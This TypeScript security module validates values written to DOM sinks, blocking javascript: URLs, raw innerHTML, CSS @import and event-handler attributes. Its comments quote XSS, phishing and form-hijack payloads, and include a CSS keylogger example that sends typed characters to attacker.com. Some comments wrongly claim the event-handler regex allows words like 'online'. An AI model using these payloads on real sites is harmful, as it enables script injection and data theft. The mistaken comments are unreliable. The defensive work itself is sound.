/**
 * REFLEX SECURITY KERNEL v6.0 ("Zero Trust")
 *
 * Centralized "Sink-Based Security" - the final firewall for all rendering targets.
 * This module defines strict validation rules for DOM/Native sinks and acts as
 * the single source of truth for security across:
 *
 * - Web (Runtime) - DOMRenderer
 * - Native (App) - VirtualRenderer
 * - Compiled (AOT) - Generated code via DOMRenderer
 *
 * === THE TRIFECTA SECURITY MODEL ===
 *
 * 1. URL Injection Sinks (Type 1): ALLOWLIST-based protocol validation
 *    - v6 UPGRADE: Switched from blocklist to allowlist
 *    - ALLOWS: http, https, mailto, tel, sms, ftp, relative URLs, data:image/*
 *    - BLOCKS: Everything else (javascript:, vbscript:, file:, ms-settings:, etc.)
 *
 * 2. Code Injection Sinks (Type 2): Blocked unless SafeHTML instance
 *    - innerHTML, outerHTML, srcdoc require SafeHTML wrapper
 *
 * 3. CSS Sinks (Type 3): Block dangerous patterns
 *    - v6 UPGRADE: Added @import blocking for CSS exfiltration prevention
 *    - BLOCKS: expression(), javascript: in url(), @import
 *
 * 4. Event Handler Sinks (Type 4): Pattern-based blocking
 *    - v6 UPGRADE: Refined regex to fix false positives/negatives
 *    - BLOCKS: onclick, on-click (Web Components), onload, etc.
 *    - ALLOWS: only, once, online (common words)
 *
 * 5. Navigation/Target Sinks (Type 5): Tabnabbing & redirect protection
 *    - v6 UPGRADE: Added formtarget to tabnabbing checks
 *
 * === ARCHITECTURAL PRINCIPLES ===
 *
 * 1. ALLOWLIST > BLOCKLIST: Unknown values are DENIED by default
 * 2. DEFENSE IN DEPTH: Multiple validation layers at different trust boundaries
 * 3. OBJECT COERCION: All values coerced to strings before validation
 * 4. ZERO TRUST: Assume all input is malicious until proven safe
 *
 * CRITICAL FIX: Object Coercion XSS Prevention
 * Objects are coerced to strings BEFORE validation because:
 * - DOM APIs call toString() on objects: el.setAttribute('href', obj) -> obj.toString()
 * - An attacker can pass { toString: () => 'javascript:alert(1)' }
 * - Without coercion, typeof === 'object' bypasses all checks
 */

import { SafeHTML } from './safe-html.js';
import { SAFE_URL_RE, RELATIVE_URL_RE } from './symbols.js';

// Control character regex for normalization (prevents evasion via \0, etc.)
const CTRL = /[\u0000-\u001F\u007F-\u009F]/g;

// DEPRECATED: Blocklist approach - kept for reference only
// const DISALLOWED_PROTOCOLS = /^javascript:/i;
//
// v6 CRITICAL FIX (Issue #3): Protocol Smuggling Prevention
// The blocklist approach is fundamentally flawed because:
// - We only blocked 'javascript:' but allowed vbscript:, file:, etc.
// - New protocols appear regularly (ms-settings:, git:, etc.)
// - This is "Never Ending Patching" - a losing battle
//
// SOLUTION: Use ALLOWLIST from symbols.ts (SAFE_URL_RE, RELATIVE_URL_RE)
// Only explicitly safe protocols are permitted: http, https, mailto, tel, sms, ftp

// SECURITY FIX (Audit Issue #4): Data URI protocol detection
// data: URIs are a primary vector for phishing attacks - an attacker can render
// a fake login page inside your app using a base64 encoded HTML string:
//   <a href="data:text/html;base64,...">Login to continue</a>
// We allow data:image/* for legitimate image embedding but block all other types.
const DATA_PROTOCOL = /^data:/i;
const DATA_IMAGE_PROTOCOL = /^data:image\//i;

/**
 * Classification of dangerous sinks by type.
 *
 * TYPE 1: URL Injection Sinks (XSS via protocol)
 *   - These accept URLs and could execute javascript: URIs
 *
 * TYPE 2: Code Injection Sinks (Strictly Blocked)
 *   - These directly inject HTML/code and must use SafeHTML
 *
 * TYPE 3: CSS Sinks (Phishing/Exfiltration)
 *   - These accept CSS and could leak data or execute code via expression()
 *
 * TYPE 4: Event Handler Sinks (XSS via inline script)
 *   - These execute JavaScript code directly (onclick, onload, etc.)
 *   - Matched by pattern, not enumeration (see isEventHandlerSink)
 *
 * TYPE 5: Navigation/Target Sinks (Clickjacking, Tabnabbing)
 *   - These control navigation behavior and can enable attacks
 */
export const SINK_TYPES: { [key: string]: number } = {
  // TYPE 1: URL Injection Sinks (XSS via protocol)
  'href': 1,
  'src': 1,
  'action': 1,
  'formAction': 1,
  'formaction': 1,  // lowercase variant
  'data': 1,
  'cite': 1,
  'poster': 1,
  'xlink:href': 1,
  'background': 1,  // Legacy but still dangerous
  'dynsrc': 1,      // IE legacy
  'lowsrc': 1,      // IE legacy

  // TYPE 2: Code Injection Sinks (Strictly Blocked)
  // Direct string assignment is NEVER safe - must use SafeHTML via renderer.setInnerHTML()
  'innerHTML': 2,
  'outerHTML': 2,
  'srcdoc': 2,

  // TYPE 3: CSS Sinks (Phishing/Exfiltration)
  'style': 3,

  // TYPE 5: Navigation/Target Sinks (Clickjacking, Tabnabbing, Meta Refresh XSS)
  // http-equiv can trigger javascript: via meta refresh
  'http-equiv': 5,
  'httpEquiv': 5,   // camelCase variant
  'target': 5,
  'formtarget': 5,
  'formTarget': 5,  // camelCase variant

  // SECURITY FIX (Audit Issue #3): Form Hijacking Prevention
  // The `form` attribute allows an input element *outside* a <form> to submit it by ID.
  // This bypasses DOM nesting and can be used to submit hidden/admin forms.
  // Example attack: <input form="admin_delete_form" type="submit" value="Click me">
  'form': 5,

  // SECURITY FIX (Audit Issue #6): Focus Stealing Prevention
  // An attacker can inject an input with `autofocus` to steal keyboard input
  // immediately upon rendering, or force the page to scroll to unexpected locations.
  'autofocus': 5
};

/**
 * Pattern to match event handler attributes.
 *
 * CRITICAL SECURITY (Audit Issue #1): Event Handler Injection Prevention
 *
 * The previous blacklist approach failed to enumerate event handlers, allowing:
 *   <div :onclick="'alert(XSS)'"></div>
 *
 * v6 CRITICAL FIX (Issue #5): Refined Event Handler Regex
 * The old pattern /^on[a-z]/i had problems:
 * - FALSE POSITIVES: Blocked valid attributes like 'only', 'once', 'online', 'ontology'
 * - FALSE NEGATIVES: Didn't match 'on-click' (Web Components custom event syntax)
 *
 * NEW PATTERN: Matches "on" followed by either:
 * - A lowercase letter then MORE characters (onclick, onload, onmouseover)
 * - A hyphen then lowercase letter (on-click, on-save - Web Components)
 *
 * This accurately targets event handlers while allowing common words:
 * - Blocks: onclick, on-save, onDOMContentLoaded, ONCLICK
 * - Allows: only, once, online (single word, no more chars after 'on' + letter)
 *
 * The pattern is case-insensitive to prevent case-manipulation bypasses.
 */
const EVENT_HANDLER_PATTERN = /^on([a-z].+|-[a-z])/i;

/**
 * Pattern to detect javascript: protocol in values.
 * Applied to ALL sink types as an additional layer of defense.
 * Case-insensitive and handles control character evasion.
 */
const JAVASCRIPT_PROTOCOL_PATTERN = /^javascript:/i;

/**
 * Pattern to detect dangerous meta refresh content.
 * Matches refresh directives that redirect to javascript: URLs.
 *
 * SECURITY FIX (Audit Issue #8): Comprehensive Meta Refresh Detection
 * Browsers are very forgiving with meta refresh syntax. Previous regex was too strict.
 * Now matches various bypass attempts:
 *   - url=javascript: (no quotes, no spaces)
 *   - url = javascript: (various spacing)
 *   - url='javascript:...' (single quotes)
 *   - url="javascript:..." (double quotes)
 *   - 0;url=javascript: (with timer)
 */
const META_REFRESH_XSS_PATTERN = /url\s*=\s*['"]?\s*javascript:/i;

/**
 * More permissive pattern for meta refresh - catches edge cases
 * that browsers might still execute but the strict regex misses.
 */
const META_REFRESH_XSS_PERMISSIVE = /(?:^|;|,)\s*(?:\d+\s*[;,]?\s*)?(?:url\s*=?\s*)?['"]?\s*javascript:/i;

/**
 * Check if a property name is an event handler attribute.
 *
 * @param prop - Property name to check
 * @returns true if the property is an event handler (on*)
 */
export function isEventHandlerSink(prop: string): boolean {
  return EVENT_HANDLER_PATTERN.test(prop);
}

/**
 * CSS patterns that are dangerous and must be blocked.
 * - expression() - IE legacy CSS expression for JS execution
 * - javascript: inside url() - Script execution via CSS
 */
const DANGEROUS_CSS = /expression\s*\(|url\s*\(\s*['"]?\s*javascript:/i;

/**
 * Validates a value before it touches a dangerous sink.
 *
 * This function is the core of the "Trifecta Gate" - it intercepts all writes
 * to dangerous DOM properties and blocks malicious values.
 *
 * CRITICAL SECURITY: Object Coercion XSS Prevention
 * All non-null values are coerced to strings BEFORE validation because:
 * - DOM APIs implicitly call toString(): el.href = obj -> obj.toString()
 * - Attacker payload: { toString: () => 'javascript:alert(1)' }
 * - Without coercion, typeof === 'object' would bypass all checks
 *
 * @param prop - The property/attribute name being set (e.g., 'href', 'innerHTML')
 * @param value - The value being assigned
 * @returns {boolean} true if safe to proceed, false if blocked
 *
 * @example
 * // Safe URL - allowed
 * validateSink('href', 'https://example.com') // true
 *
 * // XSS attempt - blocked
 * validateSink('href', 'javascript:alert(1)') // false
 *
 * // Object coercion attack - blocked
 * validateSink('href', { toString: () => 'javascript:alert(1)' }) // false
 *
 * // innerHTML with SafeHTML - allowed
 * validateSink('innerHTML', SafeHTML.sanitize('<div>Hello</div>')) // true
 *
 * // innerHTML with raw string - blocked
 * validateSink('innerHTML', '<div>Hello</div>') // false
 *
 * // CSS with expression() - blocked
 * validateSink('style', 'width: expression(alert(1))') // false
 */
export function validateSink(prop: string, value: any): boolean {
  // CRITICAL SECURITY (Audit Issue #1): Pattern-Based Event Handler Detection
  //
  // ARCHITECTURE FIX: Previously used blacklist (SINK_TYPES enumeration).
  // Now uses pattern matching to catch ALL event handlers (on*).
  // This is a DENY pattern - matches are blocked regardless of SINK_TYPES.
  if (isEventHandlerSink(prop)) {
    // TYPE 4: Event handlers are ALWAYS blocked
    // There is NO safe way to dynamically set event handlers from user input
    return false;
  }

  const type = SINK_TYPES[prop];

  // Null/undefined are safe - they result in empty string or no-op
  if (value == null) return true;

  // CRITICAL SECURITY FIX (Audit Issue #1): SafeHTML "Master Key" Bypass
  //
  // VULNERABILITY: Previously, SafeHTML was checked BEFORE sink type validation.
  // SafeHTML only guarantees that *markup* is safe (no <script> tags), but it
  // does NOT guarantee a string is a safe URL or safe CSS.
  //
  // EXPLOIT:
  //   const maliciousURL = SafeHTML.sanitize("javascript:alert(1)");
  //   // DOMPurify allows it because there are no HTML tags
  //   renderer.setAttribute(el, 'href', maliciousURL); // XSS!
  //
  // FIX: SafeHTML is ONLY valid for Type 2 sinks (innerHTML/outerHTML/srcdoc).
  // For all other sinks, coerce to string and validate against type-specific rules.
  if (type === 2) {
    // TYPE 2: HTML/Code Sinks - ONLY SafeHTML allowed
    if (SafeHTML.isSafeHTML(value)) {
      return true;
    }
    // Raw string assignment to innerHTML/outerHTML/srcdoc is blocked.
    // Developers must use SafeHTML.sanitize() to properly sanitize content.
    return false;
  }

  // CRITICAL FIX: Object Coercion XSS Prevention
  // Force string conversion BEFORE validation to catch attacks like:
  // { toString: () => 'javascript:alert(1)' }
  // This mirrors what the DOM does: el.setAttribute('href', obj) calls obj.toString()
  //
  // NOTE: Even SafeHTML values are coerced for non-Type-2 sinks because
  // SafeHTML does NOT validate URLs or CSS - only HTML content.
  const strValue = String(value);

  // SECURITY: Normalize to prevent control-character evasion
  // Attackers use "java\0script:" or "java\nscript:" to bypass naive checks
  const normalized = strValue.replace(CTRL, '').trim();

  // Not a known sink (e.g., 'id', 'class', 'title') - but still check value
  // SECURITY: Even non-sinks should be checked for javascript: in values
  // as an additional defense layer
  if (!type) {
    // Defense-in-depth: Block javascript: protocol in any attribute value
    if (JAVASCRIPT_PROTOCOL_PATTERN.test(normalized)) {
      return false;
    }
    return true;
  }

  // TYPE 1: URL Sinks - ALLOWLIST-based protocol validation
  //
  // v6 CRITICAL FIX (Issue #3): Protocol Smuggling Prevention
  // ARCHITECTURE CHANGE: Switched from BLOCKLIST to ALLOWLIST
  //
  // OLD (Blocklist - INSECURE):
  //   if (DISALLOWED_PROTOCOLS.test(normalized)) return false;
  //   Problem: Only blocked 'javascript:', missed vbscript:, file:, ms-settings:, etc.
  //
  // NEW (Allowlist - SECURE):
  //   DENY everything that isn't explicitly safe
  //   - Safe absolute URLs: http:, https:, mailto:, tel:, sms:, ftp:
  //   - Safe relative URLs: /, ./, ../, #, ?, paths without colons
  //   - Safe data URIs: data:image/* only (for legitimate image embedding)
  //
  if (type === 1) {
    // Allow safe protocols (http, https, mailto, tel, sms, ftp)
    if (SAFE_URL_RE.test(normalized)) {
      return true;
    }

    // Allow relative URLs (/, ./, ../, #anchor, ?query, paths without colons)
    if (RELATIVE_URL_RE.test(normalized)) {
      return true;
    }

    // SECURITY FIX (Audit Issue #4): Allow only data:image/* for legitimate images
    // Block all other data: URIs (they can render phishing pages)
    if (DATA_IMAGE_PROTOCOL.test(normalized)) {
      return true;
    }

    // DENY: Everything else (javascript:, vbscript:, file:, ms-settings:, etc.)
    // This is the "Zero Trust" approach - unknown protocols are blocked by default
    return false;
  }

  // TYPE 3: CSS Sinks - Block dangerous patterns
  //
  // v6 CRITICAL FIX (Issue #4, #6): CSS Exfiltration Prevention
  // Added @import blocking - external stylesheets enable data exfiltration
  // without JavaScript using CSS attribute selectors:
  //   @import "http://attacker.com/keylogger.css";
  //   /* keylogger.css: */
  //   input[value^="a"] { background: url(http://attacker.com/log?char=a) }
  //
  if (type === 3) {
    // Block @import - enables external CSS loading for data exfiltration
    if (/@import\s/i.test(normalized)) {
      return false;
    }

    // Block expression() (IE legacy) and javascript: inside url()
    if (DANGEROUS_CSS.test(normalized)) {
      return false;
    }

    return true;
  }

  // TYPE 5: Navigation/Target Sinks - Block dangerous values
  if (type === 5) {
    // http-equiv="refresh" with javascript: URL is XSS
    if (prop === 'http-equiv' || prop === 'httpEquiv') {
      // The actual danger is in the content attribute, but we should
      // still be cautious about allowing arbitrary http-equiv values
      // Block if value itself contains javascript:
      if (JAVASCRIPT_PROTOCOL_PATTERN.test(normalized)) {
        return false;
      }
    }

    // For content attribute paired with http-equiv="refresh"
    // Check for meta refresh XSS pattern - use both strict and permissive patterns
    // SECURITY FIX (Audit Issue #8): Use permissive pattern to catch edge cases
    if (META_REFRESH_XSS_PATTERN.test(normalized) || META_REFRESH_XSS_PERMISSIVE.test(normalized)) {
      return false;
    }

    // SECURITY FIX (Audit Issues #3, #6): form and autofocus validation
    // These are now in SINK_TYPES but we allow most values - the sink registration
    // itself provides visibility for security auditing. Block only if the value
    // contains javascript: protocol (defense in depth).
    if (prop === 'form' || prop === 'autofocus') {
      if (JAVASCRIPT_PROTOCOL_PATTERN.test(normalized)) {
        return false;
      }
    }

    return true;
  }

  return true;
}

/**
 * Get the sink type for a property.
 *
 * @param prop - Property name to check
 * @returns Sink type (1=URL, 2=Code, 3=CSS) or undefined if not a sink
 */
export function getSinkType(prop: string): number | undefined {
  return SINK_TYPES[prop];
}

/**
 * Check if a property is a dangerous sink.
 *
 * @param prop - Property name to check
 * @returns true if the property is a sink that requires validation
 */
export function isSink(prop: string): boolean {
  return prop in SINK_TYPES;
}

/**
 * Get a human-readable description of why a value was blocked.
 * Useful for development mode warnings.
 *
 * @param prop - The sink property
 * @param value - The blocked value
 * @returns Description of the security violation
 */
export function getBlockReason(prop: string, value: any): string {
  // Check for event handler first (pattern-based, not in SINK_TYPES)
  if (isEventHandlerSink(prop)) {
    return `Blocked event handler attribute '${prop}'. Event handlers cannot be set dynamically from user input.`;
  }

  const type = SINK_TYPES[prop];
  const strValue = value != null ? String(value).replace(CTRL, '').trim() : '';

  if (type === 1) {
    // v6: Allowlist-based - provide helpful error messages
    if (DATA_PROTOCOL.test(strValue) && !DATA_IMAGE_PROTOCOL.test(strValue)) {
      return `Blocked non-image data: URI in URL sink '${prop}'. Only data:image/* is allowed to prevent phishing.`;
    }
    // Check for common dangerous protocols to give specific feedback
    if (/^javascript:/i.test(strValue)) {
      return `Blocked javascript: protocol in URL sink '${prop}'. Use event handlers instead.`;
    }
    if (/^vbscript:/i.test(strValue)) {
      return `Blocked vbscript: protocol in URL sink '${prop}'. Legacy scripting protocols are not allowed.`;
    }
    if (/^file:/i.test(strValue)) {
      return `Blocked file: protocol in URL sink '${prop}'. Local file access is not allowed.`;
    }
    // Generic message for other blocked protocols
    return `Blocked URL in sink '${prop}'. Only safe protocols (http, https, mailto, tel, sms, ftp) and relative URLs are allowed.`;
  }
  if (type === 2) {
    return `Blocked direct assignment to code injection sink '${prop}'. Use SafeHTML.sanitize() with m-html directive instead.`;
  }
  if (type === 3) {
    // v6: Added @import detection for better error messages
    if (/@import\s/i.test(strValue)) {
      return `Blocked @import in style sink '${prop}'. @import enables CSS-based data exfiltration.`;
    }
    return `Blocked dangerous CSS pattern in style sink '${prop}'. expression() and javascript: in url() are not allowed.`;
  }
  if (type === 5) {
    if (prop === 'form') {
      return `Blocked potentially dangerous value in form sink '${prop}'. Form hijacking can submit unintended forms.`;
    }
    if (prop === 'autofocus') {
      return `Blocked potentially dangerous value in autofocus sink '${prop}'. Focus stealing can capture user input.`;
    }
    return `Blocked dangerous value in navigation/target sink '${prop}'. This could enable clickjacking, tabnabbing, or meta refresh XSS.`;
  }

  // Check if it was a javascript: protocol in a non-sink attribute (defense in depth)
  if (JAVASCRIPT_PROTOCOL_PATTERN.test(strValue)) {
    return `Blocked javascript: protocol in attribute '${prop}' (defense in depth)`;
  }

  return `Unknown security violation for sink '${prop}'`;
}
